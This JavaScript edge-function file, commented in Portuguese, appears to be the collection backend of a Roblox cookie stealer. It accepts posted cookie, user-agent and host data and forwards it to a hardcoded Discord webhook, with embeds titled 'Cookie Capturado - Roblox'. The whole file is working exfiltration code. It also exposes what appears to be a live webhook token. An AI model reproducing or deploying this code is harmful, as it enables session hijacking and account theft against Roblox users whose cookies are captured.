export const config = { runtime: "edge" };

const WEBHOOK_URL = "https://discord.com/api/webhooks/1280941270138617957/e7v-FHCaX2LGwZZuKXhHTyBSCEa4vcPPPIeTsQISfv8WEJ5s0utTnnnQ5flRLYAu2ks3";

async function sendToWebhook(dataList) {
  // dataList é array de objetos com cookie, userAgent, host e opcional title
  const embeds = dataList.map(d => ({
    title: d.title || "Cookie Capturado - Roblox",
    color: 15158332, // vermelho padrão do Discord
    fields: [
      { name: "Cookie", value: `\`\`\`${(d.cookie || "Não enviado").slice(0, 1024)}\`\`\``, inline: false },
      { name: "User Agent", value: `\`\`\`${(d.userAgent || "Não enviado").slice(0, 1024)}\`\`\``, inline: false },
      { name: "Host", value: d.host || "Desconhecido", inline: true },
      { name: "Timestamp", value: new Date().toISOString(), inline: true },
    ],
  }));

  const payload = { embeds }; // CORRETO: embeds no plural

  const res = await fetch(WEBHOOK_URL, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(payload),
  });

  if (!res.ok) throw new Error(`Erro ao enviar webhook: ${await res.text()}`);

  return true;
}

export default async function handler(req) {
  try {
    if (req.method !== "POST") {
      return new Response("Use método POST com JSON", { status: 405 });
    }

    const body = await req.json();

    if (!body.data || !Array.isArray(body.data)) {
      return new Response("JSON inválido, envie { data: [...] }", { status: 400 });
    }

    await sendToWebhook(body.data);

    return new Response("Dados enviados com sucesso!", { status: 200 });
  } catch (error) {
    return new Response(`Erro interno: ${error.message}`, { status: 500 });
  }
}
